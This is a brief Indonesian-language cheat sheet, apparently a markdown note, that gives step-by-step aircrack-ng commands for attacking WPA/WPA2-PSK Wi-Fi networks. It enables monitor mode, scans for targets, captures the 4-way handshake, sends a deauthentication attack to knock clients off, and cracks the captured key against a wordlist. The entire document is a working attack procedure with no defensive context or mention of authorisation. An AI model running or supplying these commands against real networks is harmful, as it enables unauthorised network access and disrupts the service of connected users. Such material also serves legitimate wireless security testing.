# Capture 4-Way Handshake

#### 1. Aktifkan Mode Monitor

```
airmon-ng check kill
airmon-ng start [interface]
```

#### 2. Scan Wi-Fi WPA/WPA2-PSK

```
airodump-ng --encrypt wpa [interface]
```

#### 3. Capture 4-Way Handshake

```
airodump-ng --bssid [bssid] --channel [channel] --write [output] [interface]
```

#### 4. Jalankan Serangan Deauth

```
aireplay-ng -0 10 -a [bssid] [interface]
```

#### 5. Crack Kunci WPA/WPA2-PSK

```
aircrack-ng -a 2 [file_capture] -w [wordlist]
```
